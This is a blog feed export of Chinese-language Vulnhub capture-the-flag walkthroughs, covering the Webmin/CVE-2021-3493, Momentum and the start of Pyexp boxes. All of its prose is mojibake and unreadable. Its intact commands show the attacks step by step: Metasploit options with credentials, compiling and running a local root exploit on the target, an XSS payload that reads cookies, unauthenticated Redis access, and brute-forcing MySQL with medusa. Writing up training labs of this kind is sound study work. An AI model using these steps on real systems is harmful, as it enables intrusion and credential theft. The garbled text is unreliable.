<p>ä¾æ¬¡å°†å‚æ•°å¡«å…¥ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set rhost 10.0.2.23</span><br><span class="line">set password tokiohotel</span><br><span class="line">set username admin</span><br><span class="line">set SSL true # åˆ‡è®°ï¼Œ10000ç«¯å£è¦æ±‚ssl</span><br><span class="line">set lhost 10.0.2.4</span><br><span class="line">run</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161215.png" /></p>
<p>å¾—åˆ°sessionåï¼Œè¾“å…¥ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shell</span><br><span class="line">python</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°ä¸€ä¸ªäº¤äº’å¼çš„shell</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424161414.png" /></p>
<h4 id="æ–¹æ³•3">2.4.2.3. æ–¹æ³•3</h4>
<p>é€šè¿‡ä¿¡æ¯æ”¶é›†ï¼Œå‘ç°é¶æœºçš„æ“ä½œç³»ç»Ÿæ˜¯Ubuntu <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Distributor ID: Ubuntu</span><br><span class="line">Description:    Ubuntu 18.04.5 LTS</span><br><span class="line">Release:        18.04</span><br><span class="line">Codename:       bionic</span><br></pre></td></tr></table></figure></p>
<p>è€Œ CVE-2021-3493 æ˜¯ä¸“é—¨é’ˆå¯¹Ubuntuçš„ä¸€ä¸ªæ¼æ´ã€‚å› æ­¤å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚æˆ‘ä»¬å…ˆå›åˆ°ripperç”¨æˆ·ï¼Œç”±äºé¶æœºä¸Šæ²¡æœ‰gccï¼Œå› æ­¤åœ¨kaliä¸Šç¼–è¯‘å®Œæˆä¹‹åå‘é€åˆ°é¶æœºæ‰§è¡Œå³å¯ã€‚</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">// 1. ç¼–è¯‘</span><br><span class="line">gcc exploit.c -o exp</span><br><span class="line"></span><br><span class="line">// 2. å‘é€åˆ°é¶æœº</span><br><span class="line">scp exp ripper@10.0.2.23:~/ <span class="comment"># éœ€è¦è¾“å…¥å¯†ç </span></span><br><span class="line"></span><br><span class="line">// 3. æ‰§è¡Œ</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162026.png" /></p>
<h3 id="ç•ªå¤–">2.4.3. ç•ªå¤–</h3>
<p>åˆšå¼€å§‹çš„æ—¶å€™å¹¶ä¸ä¼šä½¿ç”¨findå‘½ä»¤ï¼Œè€Œæ˜¯ä¸€ä¸ªä¸€ä¸ªæ–‡ä»¶æŸ¥çœ‹ï¼Œç›´åˆ°æŸ¥çœ‹äº†/home/ripper/.bash_historyï¼Œå†…å®¹å¦‚ä¸‹ï¼ˆåé¢çš„ä¸€äº›å‘½ä»¤è®°å½•çš„æ˜¯æˆ‘ä»¬ä½¿ç”¨çš„ï¼Œä½†æ˜¯å‰é¢çš„æ˜¯ä½œè€…ä½¿ç”¨çš„ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162218.png" /></p>
<p>ç„¶åæ‰å»æ‰¾secret.fileæ–‡ä»¶ï¼Œå› æ­¤æ‹¿åˆ°cubesçš„æƒé™ã€‚è·å¾—rootæƒé™ä¹Ÿæ˜¯å¦‚æ­¤ï¼ŒæŸ¥çœ‹/home/cubes/.bash_history</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220424162508.png" /></p>
<p>ç„¶åæŸ¥çœ‹å…¶ä¸­æ¶‰åŠçš„è®¸å¤šæ–‡ä»¶ï¼Œå‘ç°äº†miniserv.logä¸­è®°å½•ç€ç™»å½•ç•Œé¢çš„ç”¨æˆ·åå’Œå¯†ç ã€‚åé¢çš„æ­¥éª¤å’Œæ–¹æ³•2ä¸€è‡´äº†ã€‚</p>
<h1 id="æ€»ç»“">3. æ€»ç»“</h1>
<p>è¯¥é¶æœºçš„éš¾åº¦åœ¨äºèƒ½å¦åœ¨åˆ°ripsçš„è·¯å¾„ï¼Œä»¥åŠä¿¡æ¯æ”¶é›†çš„èƒ½åŠ›ï¼Œå¦‚æœæ²¡æœ‰ä½¿ç”¨findå‘½ä»¤ï¼Œé‚£å°±éœ€è¦çœ‹è®¸å¤šçš„æ–‡ä»¶æ‰å¯ä»¥æå‡æƒé™ã€‚</p>
<p>è¯¥é¶æœºçš„å‘å¸ƒæ—¶é—´æ˜¯æ—©äº CVE-2021-3493 çš„ï¼Œå› æ­¤æ”¾æ³•2åªèƒ½ç®—æ˜¯å–å·§äº†ã€‚</p>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>ripsä»£ç å®¡è®¡</tag>
        <tag>å¤‡ä»½æ–‡ä»¶æ³„å¯†</tag>
        <tag>CVE-2021-3493</tag>
        <tag>Webminæ¼æ´åˆ©ç”¨</tag>
      </tags>
  </entry>
  <entry>
    <title>16 Vulnhub Momentum Writeup</title>
    <url>/2022/04/26/16%20Vulnhub%20Momentum%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸­ç­‰ï¼Œå¦‚æœä¹‹å‰å°±çŸ¥é“redisç›¸å…³æ¼æ´çš„è¯ï¼Œé‚£éš¾åº¦å°±æ˜¯ç®€å•ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">1. é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/momentum-1,685/">Momentum: 1 ~ VulnHub</a></li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>ä¸­</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>æ‹¿åˆ°rootæƒé™</li>
<li>æ‹¿åˆ°2ä¸ªflag</li>
</ul>
<p>æ¶‰åŠæ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>ä¿¡æ¯æ”¶é›†</li>
<li>Webè·¯å¾„çˆ†ç ´</li>
<li><strong>JSè„šæœ¬åˆ†æ</strong></li>
<li><strong>AESè§£å¯†</strong></li>
<li><strong>Redisè®¤è¯æ¼æ´</strong></li>
</ul>
<p>å‚è€ƒï¼š</p>
<ul>
<li><a href="https://www.freebuf.com/articles/web/249238.html">Redisç³»åˆ—æ¼æ´æ€»ç»“ - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></li>
<li><a href="http://www.npmdoc.org/crypto-jszhongwenwendangcrypto-js-jszhongwenjiaochengjiexi.html">crypto-jsèµ„æ–™</a></li>
</ul>
<h1 id="æ¸—é€">2. æ¸—é€</h1>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">2.1. ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.239</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.239</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160344.png" /></p>
<p>ä¿¡æ¯ï¼š</p>
<ul>
<li>22ç«¯å£çš„æœåŠ¡ä½ssh</li>
<li>80ç«¯å£çš„æœåŠ¡ä¸ºhttp</li>
<li>é¶æœºæ“ä½œç³»ç»Ÿä¸ºDebian</li>
</ul>
<h2 id="è®¿é—®httpæœåŠ¡-get-shell">2.2. è®¿é—®httpæœåŠ¡ + get shell</h2>
<h3 id="httpæœåŠ¡">2.2.1. httpæœåŠ¡</h3>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160525.png" /></p>
<p>ç½‘ç«™çš„é¡µé¢æœ‰å››å¼ å›¾ç‰‡ï¼Œå¹¶ä¸”è¿™äº›å›¾ç‰‡å¯ä»¥ç‚¹å‡»ï¼Œç¬¬ä¸€æ¬¡ç‚¹å‡»å¯ä»¥æ”¾å¤§å›¾ç‰‡ï¼Œç¬¬äºŒæ¬¡ç‚¹å‡»å°±ä¼šæ˜¾ç¤ºå›¾ç‰‡çš„è¯¦ç»†ä¿¡æ¯ã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160616.png" /></p>
<p>æ³¨æ„åˆ°urlä¸­æœ‰ä¸€ä¸ªå‚æ•°idï¼Œå¹¶ä¸”idçš„å€¼å’Œè¿™å¼ å›¾ç‰‡çš„nameæ˜¯ä¸€æ ·çš„ã€‚å¦‚æœidéšä¾¿è¾“å…¥ï¼Œä¼šå‘ç°é¡µé¢æ˜¾ç¤ºçš„å’Œæˆ‘ä»¬è¾“å…¥çš„æ˜¯ä¸€æ ·çš„</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426160756.png" /></p>
<p>ä¹‹å‰è¯´è¿‡ï¼Œè¿™ç§æƒ…å†µä¸‹å¯èƒ½å­˜åœ¨ç€ä¸‰ç§ç±»å‹çš„æ¼æ´ï¼š</p>
<ol type="1">
<li>SQLæ³¨å…¥ã€</li>
<li>XSS</li>
<li>SSTI</li>
</ol>
<p>ç»è¿‡å°è¯•ï¼Œåªå­˜åœ¨XSSæ¼æ´ï¼Œä½†æ˜¯ç›®å‰è¿˜æ²¡æœ‰ä»€ä¹ˆç”¨ã€‚</p>
<p>æŸ¥çœ‹æºç ä¹Ÿæ²¡å‘ç°å¤šå°‘æœ‰ç”¨çš„ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥è¿›è¡Œè·¯å¾„æ‰«æã€‚</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161035.png" /></p>
<p>ç»è¿‡å¯¹æ‰€æœ‰ç›®å½•çš„æŸ¥çœ‹ï¼Œæœ€ç»ˆå‘ç°/js/main.jsä¸­çš„ä»£ç æœ‰ç‚¹å¥‡æ€ªï¼š <figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewDetails</span>(<span class="params">str</span>) </span>&#123;                                                                                </span><br><span class="line">  <span class="built_in">window</span>.location.href = <span class="string">&quot;opus-details.php?id=&quot;</span>+str;                                                       </span><br><span class="line">&#125;                                                                                                          </span><br><span class="line"><span class="comment">/*                                                                                                       </span></span><br><span class="line"><span class="comment">var CryptoJS = require(&quot;crypto-js&quot;);                                                                       </span></span><br><span class="line"><span class="comment">var decrypted = CryptoJS.AES.decrypt(encrypted, &quot;SecretPassphraseMomentum&quot;);</span></span><br><span class="line"><span class="comment">console.log(decrypted.toString(CryptoJS.enc.Utf8));</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆæˆ‘ä¸æ€ä¹ˆä¼šjsï¼‰æ ¹æ®å¯¹ä»£ç çš„åˆ†æï¼Œæˆ‘ä»¬åˆšåˆšè¾“å…¥çš„idï¼Œç„¶åä¼šç»è¿‡viewDetailså®šä½åˆ°å¯¹åº”çš„æ–‡ä»¶ï¼Œç„¶åè¿”å›ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æœæ²¡æœ‰å¯¹åº”çš„æ–‡ä»¶ï¼Œå°±ç›´æ¥æ˜¾ç¤ºidçš„å€¼ã€‚è¿™é‡Œçš„é‡ç‚¹åœ¨äºæ³¨é‡Šéƒ¨åˆ†ï¼Œ<strong>å…ˆæ˜¯è°ƒç”¨äº†crypto-jsåº“ï¼Œç„¶åè°ƒç”¨äº†è§£å¯†æ–¹æ³•ï¼Œæœ€åå°†è§£å¯†çš„ç»“æœå˜æˆå­—ç¬¦ä¸²</strong>ã€‚</p>
<p>ç»è¿‡æœç´¢ï¼Œå‘ç°è¿™ä¸ªåº“çš„decryptæ–¹æ³•çš„ä½¿ç”¨å¦‚ä¸‹ï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426161944.png" /></p>
<p>å› æ­¤çŒœæµ‹ SecretPassphraseMomentum å°±æ˜¯è§£å¯†çš„å¯†é’¥ï¼Œé‚£ä¹ˆç°åœ¨å°±éœ€è¦æ‰¾åˆ°åŠ å¯†åçš„å­—ç¬¦ä¸²è§£å¯†å°±å¯ä»¥äº†ã€‚</p>
<p>è¿™æ—¶å€™æƒ³åˆ°äº†ä¹‹å‰å¾—åˆ°çš„XSSæ¼æ´ï¼Œä¸€èˆ¬XSSéƒ½å’Œcookieæœ‰å…³ï¼Œå› æ­¤åˆ©ç”¨è¯¥æ¼æ´æŸ¥çœ‹ä¸€ä¸‹cookieçš„å€¼ï¼ˆä¹Ÿå¯ä»¥ç›´æ¥æŠ“åŒ…ï¼‰ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure></p>
<p>å¾—åˆ°cookieçš„å€¼ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cookie=U2FsdGVkX193yTOKOucUbHeDp1Wxd5r7YkoM8daRtj0rjABqGuQ6Mx28N1VbBSZt</span><br></pre></td></tr></table></figure></p>
<p>éšä¾¿æ‰¾ä¸€ä¸ªAESåœ¨çº¿è§£å¯†å¹³å°ï¼Œè§£å¯†å¾—åˆ°ä¸€ä¸²å­—ç¬¦ï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
<h3 id="get-shell">2.2.2. get shell</h3>
<p>ç°åœ¨åªæœ‰ä¸€ä¸ªsshéœ€è¦ç”¨æˆ·åå’Œå¯†ç ï¼Œå› æ­¤å°è¯•ç™»å½•ï¼Œæœ€ç»ˆçš„ç”¨æˆ·åå’Œå¯†ç ä¸ºï¼š <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ç”¨æˆ·å: auxerre</span><br><span class="line">å¯†ç : auxerre-alienum##</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162538.png" /></p>
<h2 id="æƒé™æå‡">2.3. æƒé™æå‡</h2>
<p>é¦–å…ˆè¿›è¡Œä¿¡æ¯æ”¶é›†ï¼Œå‘ç°é¶æœºçš„å†…æ ¸ç‰ˆæœ¬ä¸æ˜¯æœ€æ–°çš„</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162635.png" /></p>
<p>å› æ­¤å°è¯•ç”¨msfæœç´¢ï¼Œè™½ç„¶æœ‰å‡ ä¸ªå¯ä»¥åˆ©ç”¨çš„expï¼Œä½†æ˜¯ç»å°è¯•ï¼Œéƒ½æ— æ³•ææƒã€‚æœ€ç»ˆåœ¨æŸ¥çœ‹ /etc/passwd çš„æ—¶å€™å‘ç°äº†ä¸€ä¸ªç‰¹æ®Šçš„ç”¨æˆ· redis</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426162742.png" /></p>
<p>è¿™æ˜¯ä¸€ä¸ªéå…³ç³»å‹çš„æ•°æ®åº“ï¼Œä¸€ç›´éƒ½æœ‰è®¸å¤šçš„å®‰å…¨é—®é¢˜ã€‚å…¶ä¸­æœ‰ä¸€ä¸ª<strong>æœªæˆæƒè®¤è¯çš„æ¼æ´</strong>ï¼Œå°±æ˜¯åªè¦éƒ¨ç½²äº†redisï¼Œé‚£ä¹ˆå°±ä¼šç›‘å¬æ‰€æœ‰çš„ç½‘å¡ï¼Œå¹¶ä¸”åªè¦èƒ½å¤Ÿè®¿é—®åˆ°å½“å‰ä¸»æœºï¼Œé‚£ä¹ˆéƒ½å¯ä»¥è®¿é—®åˆ°redisï¼Œä¸éœ€è¦ç»è¿‡è®¤è¯å°±å¯ä»¥è¿›è¡Œæ“ä½œï¼redisé»˜è®¤ç›‘å¬6479ç«¯å£ï¼Œå› æ­¤å…ˆæŸ¥çœ‹ç«¯å£ï¼Œçœ‹ä¸€ä¸‹æ˜¯å¦å¯ç”¨äº†redis</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163318.png" /></p>
<p>å‘ç°ç¡®å®å¯ç”¨äº†ã€‚é‚£ä¹ˆç›´æ¥è®¿é—® <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">redis-cli <span class="comment"># è®¿é—®redis</span></span><br><span class="line">info <span class="comment"># æŸ¥çœ‹ç›¸å…³ä¿¡æ¯ï¼Œå¦‚æœèƒ½æ˜¾ç¤ºï¼Œè¯´æ˜å­˜åœ¨æœªæˆæƒè®¤è¯æ¼æ´</span></span><br><span class="line">keys * <span class="comment"># è·å–æ‰€æœ‰é”®</span></span><br><span class="line">get keyName <span class="comment"># è·å–é”®çš„ä¿¡æ¯</span></span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163858.png" /></p>
<p>åˆ©ç”¨å¾—åˆ°çš„å¯†ç ç™»å½•root</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220426163932.png" /></p>
<p>æœ€åï¼Œè¯»å–2ä¸ªflag: <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 1. /hoem/auxerre/user.txt</span><br><span class="line">[ Momentum - User Owned ]</span><br><span class="line">---------------------------------------</span><br><span class="line">flag : 84157165c30ad34d18945b647ec7f647</span><br><span class="line">---------------------------------------</span><br><span class="line"></span><br><span class="line">// 2. /root/toot.txt</span><br><span class="line">[ Momentum - Rooted ]</span><br><span class="line">---------------------------------------</span><br><span class="line">Flag : 658ff660fdac0b079ea78238e5996e40</span><br><span class="line">---------------------------------------</span><br><span class="line">by alienum with &lt;3</span><br></pre></td></tr></table></figure></p>
<h1 id="æ€»ç»“">3. æ€»ç»“</h1>
<p>è¯¥é¶æœºéš¾åº¦ä¸­ç­‰ã€‚æˆ‘åœ¨æ‰“é¶è¿‡ç¨‹ä¸­é‡åˆ°äº†ä¸¤ä¸ªé—®é¢˜ï¼š</p>
<ol type="1">
<li>æˆ‘ä¹Ÿæ‰¾åˆ°äº†XSSæ¼æ´å’ŒJSä»£ç ï¼Œä½†æ˜¯æ²¡æœ‰å°†ä¸¤è€…è”æƒ³èµ·æ¥ï¼›</li>
<li>ä¹‹å‰ä»æ¥æ²¡æœ‰é‡åˆ°è¿‡redisï¼Œä¸çŸ¥é“è¿™æ˜¯ä»€ä¹ˆï¼›</li>
</ol>
]]></content>
      <categories>
        <category>å†…ç½‘æ¸—é€</category>
      </categories>
      <tags>
        <tag>ç»¼åˆ</tag>
        <tag>vulnhub</tag>
        <tag>JSè„šæœ¬åˆ†æ</tag>
        <tag>Redisè®¤è¯æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>17 Vulnhub Pyexp Writeup</title>
    <url>/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/</url>
    <content><![CDATA[<p>è¯¥é¶æœºéš¾åº¦ä¸æ˜¯å¾ˆé«˜ï¼Œä½†æ˜¯å¾ˆæœ‰ç‰¹ç‚¹ã€‚</p>
<span id="more"></span>
<h1 id="é¶æœºä¿¡æ¯">1. é¶æœºä¿¡æ¯</h1>
<p>é¶æœºåœ°å€ï¼š</p>
<ul>
<li><a href="https://www.vulnhub.com/entry/pyexp-1,534/">pyexp: 1 ~ VulnHub</a></li>
</ul>
<p>æ³¨æ„ï¼š</p>
<ul>
<li>ä½¿ç”¨ WMware è¿è¡Œè™šæ‹Ÿæœº</li>
</ul>
<p>éš¾åº¦ï¼š</p>
<ul>
<li>ä¸­</li>
</ul>
<p>ç›®æ ‡ï¼š</p>
<ul>
<li>å–å¾—rootæƒé™</li>
<li>æ‹¿åˆ°2ä¸ªflag</li>
</ul>
<p>æ”»å‡»æ–¹æ³•ï¼š</p>
<ul>
<li>ä¸»æœºå‘ç°</li>
<li>ç«¯å£æ‰«æ</li>
<li>ä¿¡æ¯æ”¶é›†</li>
<li>SSHå¯†ç çˆ†ç ´</li>
<li>MySQLå¯†ç çˆ†ç ´</li>
<li>MySQLæ‰§è¡Œä»£ç </li>
<li>ç¼–å†™è§£å¯†ä»£ç </li>
<li>sudoæƒé™æ¼æ´</li>
<li>pythonå‡½æ•°</li>
<li>æœ¬åœ°ææƒ</li>
</ul>
<h1 id="æ¸—é€">2. æ¸—é€</h1>
<p>kaliï¼š192.168.137.10</p>
<p>é¶æœº: 192.168.137.11</p>
<h2 id="ä¸»æœºå‘ç°ç«¯å£æ‰«æç«¯å£æœåŠ¡å‘ç°">2.1. ä¸»æœºå‘ç°ã€ç«¯å£æ‰«æã€ç«¯å£æœåŠ¡å‘ç°</h2>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 192.168.137.11</span><br><span class="line">sudo nmap -p1337,3306 -A 192.168.137.11</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225554.png" /></p>
<p>ä¿¡æ¯ï¼š</p>
<ul>
<li>1337ç«¯å£çš„æœåŠ¡ä¸ºsshï¼›</li>
<li>3306ç«¯å£çš„æœåŠ¡ä¸ºMySQLï¼ŒMariaDBæ˜¯MySQLçš„ä¸€ä¸ªåˆ†æ”¯ï¼›</li>
</ul>
<p>å¾ˆå¥‡æ€ªçš„æ˜¯è¯¥é¶æœºå±…ç„¶æ²¡æœ‰httpæœåŠ¡ï¼ï¼ï¼</p>
<h2 id="mysqlå¯†ç çˆ†ç ´">2.2. MySQLå¯†ç çˆ†ç ´</h2>
<p>å¯ä»¥å…ˆè¿›è¡Œsshå¯†ç çˆ†ç ´ï¼Œå› æ­¤æ­¤æ—¶ä¸çŸ¥é“é¶æœºä¸Šæœ‰å“ªäº›ç”¨æˆ·ï¼Œå¯ä»¥å…ˆç”¨rootè·‘</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427225159.png" /></p>
<p>æ—¶é—´éå¸¸çš„é•¿ï¼Œå¹¶ä¸”æœ€ç»ˆä¹Ÿè·‘ä¸å‡ºæ¥ã€‚</p>
<p>MySQLä¹Ÿæœ‰ä¸€ä¸ªé»˜è®¤çš„ç”¨æˆ·rootï¼Œä½†æ˜¯æ­¤rootå¹¶ä¸æ˜¯æ“ä½œç³»ç»Ÿçš„rootã€‚è¾“å…¥å¦‚ä¸‹å‘½ä»¤è¿›è¡Œçˆ†ç ´ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">medusa -h 192.168.137.11 -M mysql -u root -P rockyou.txt</span><br></pre></td></tr></table></figure></p>
<p>ï¼ˆhydraå‡ºäº†ç‚¹é—®é¢˜ï¼Œä½¿ç”¨medusaè¿›è¡Œçˆ†ç ´ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼‰</p>
<p>æœ€ç»ˆå¾—åˆ°ç»“æœï¼š</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427231946.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql</span><br><span class="line">username: root</span><br><span class="line">password: prettywoman</span><br></pre></td></tr></table></figure>
<p>è¿œç¨‹ç™»å½•æ•°æ®åº“ï¼š <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql -h 192.168.137.11 -u root -p</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232053.png" /></p>
<h2 id="ä¿¡æ¯æ”¶é›†">2.3. ä¿¡æ¯æ”¶é›†</h2>
<p>æ€»æ‰€å‘¨çŸ¥ï¼ŒMySQLæ˜¯å¯ä»¥ææƒçš„ï¼Œä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªé—®é¢˜å°±æ˜¯ï¼Œå½“å‰æ‰§è¡ŒMySQLçš„ç”¨æˆ·æ˜¯kaliçš„ç”¨æˆ·ï¼Œå¹¶ä¸æ˜¯é¶æœºçš„ç”¨æˆ·ï¼Œå› æ­¤å°±ç®—åˆ©ç”¨MySQLå‘½ä»¤æ‰§è¡Œææƒå¾—åˆ°çš„ä¹Ÿæ˜¯kaliçš„ç”¨æˆ·çš„æƒé™ã€‚å¯ä»¥åˆ©ç”¨ä¸‹è¿°å‘½ä»¤æ‰§è¡Œç³»ç»ŸæŸ¥çœ‹idå°±å¯ä»¥çŸ¥é“ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">\! id &lt;==&gt; system id &lt;==&gt; select do_system(&#x27;id&#x27;) # é¶æœºä¸Šæ— æ³•è¿è¡Œç¬¬ä¸‰ä¸ª</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232347.png" /></p>
<p>è¿˜å¯ä»¥è¯»å–MySQLçš„é»˜è®¤é…ç½®ä»¥åŠç³»ç»Ÿæ–‡ä»¶çš„å†…å®¹ï¼Œé»˜è®¤é…ç½®æ–‡ä»¶æ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯ï¼Œè€Œ/etc/passwdé‡Œé¢åè€Œæœ‰ä¿¡æ¯</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># æŸ¥çœ‹æ˜¯å¦èƒ½å¤Ÿè¿›è¡Œæ–‡ä»¶çš„è¯»å–å’Œå†™å…¥æ“ä½œ</span><br><span class="line">show variables like &#x27;secure_file_priv&#x27;;</span><br><span class="line"></span><br><span class="line">+------------------+-------+</span><br><span class="line">| Variable_name    | Value |</span><br><span class="line">+------------------+-------+</span><br><span class="line">| secure_file_priv |       |</span><br><span class="line">+------------------+-------+</span><br><span class="line"></span><br><span class="line">å¯ä»¥ï¼</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220427232522.png" /></p>
<p>å¯ä»¥å‘ç°é™¤äº†rootä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªlucyç”¨æˆ·ã€‚å…¶å®è¿™é‡Œä¹Ÿå¯ä»¥å†æ¬¡è¿›è¡Œsshçˆ†ç ´ï¼Œä½†æ˜¯è¿˜æ˜¯æ²¡ç»“æœã€‚</p>
<p>å…¶å®ä¹Ÿå¯ä»¥æŸ¥çœ‹ä¸€ä¸‹/home/lucy/.ssh/id_rsaï¼Œå¦‚æœå­˜åœ¨çš„è¯ï¼Œå°±å¯ä»¥åˆ©ç”¨å¯†é’¥ç™»é™†sshï¼Œå¯æƒœä¸å­˜åœ¨ã€‚</p>
<p>æœ€ç»ˆæŸ¥çœ‹æ•°æ®åº“å‘ç°æœ‰å››ä¸ªæ•°æ®åº“ <figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">MariaDB [(<span class="keyword">none</span>)]<span class="operator">&gt;</span> <span class="keyword">show</span> databases;</span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> Database           <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="operator">|</span> data               <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> information_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> mysql              <span class="operator">|</span></span><br><span class="line"><span class="operator">|</span> performance_schema <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">--------------------+</span></span><br><span class="line"><span class="number">4</span> <span class="keyword">rows</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.001</span> sec)</span><br></pre></td></tr></table></figure></p>
<p>å…¶ä¸­ï¼Œåªæœ‰ç¬¬ä¸€ä¸ªæ˜¯åæ¥ç”Ÿæˆçš„ï¼Œè€Œåé¢çš„ä¸‰ä¸ªéƒ½æ˜¯MySQLè‡ªå¸¦çš„ã€‚æŸ¥çœ‹ç¬¬ä¸€ä¸ªæ•°æ®ï¼Œå‘ç°æœ‰ä¸€ä¸ªè¡¨fernetï¼Œé‡Œé¢çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p>
<table>
<colgroup>
<col style="width: 50%" />
<col style="width: 50%" />
</colgroup>
<thead>
<tr class="header">
<th>cred</th>
<th>keyy</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>gAAAAABfMbX0bqWJTTdHKUYYG9U5Y6JGCpgEiLqmYIVlWB7t8gvsuayfhLOO_cHnJQF1_ibv14si1MbL7Dgt9Odk8mKHAXLhyHZplax0v02MMzh_z_eI7ys=</td>
<td>UJ5_V_b-TWKKyzlErA96f-9aEnQEfdjFbRKt8ULjdV0=</td>
</tr>
</tbody>
</table>
<p>æ²¡æœ‰ä»»ä½•å…¶ä»–çš„ä¿¡æ¯äº†ï¼Œé‚£ä¹ˆä¿¡æ¯åº”è¯¥å°±éšè—åœ¨ä¸Šè¿°è¡¨æ ¼ä¸­ï¼Œå› ä¸ºcredå’Œkeyçœ‹èµ·æ¥å¾ˆåƒæ˜¯å¯†ç å’Œå¯†é’¥ã€‚</p>
<h2 id="get-shell">2.4. get shell</h2>
